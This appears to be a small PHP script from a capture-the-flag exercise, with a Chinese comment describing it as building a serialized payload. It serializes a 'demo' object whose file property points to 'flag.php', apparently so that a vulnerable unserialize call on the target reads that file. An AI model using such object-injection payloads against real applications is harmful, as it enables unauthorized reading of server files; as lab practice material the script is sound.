<?php
	//构造序列化参数 并输出 作为payload
	class demo {
		public $file;
		function __construct($filename = 'flag.php') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file)) 
			{
				return @file_get_contents($this->file);
			}
		}
	}

	$x = new demo();
	echo serialize($x);
?>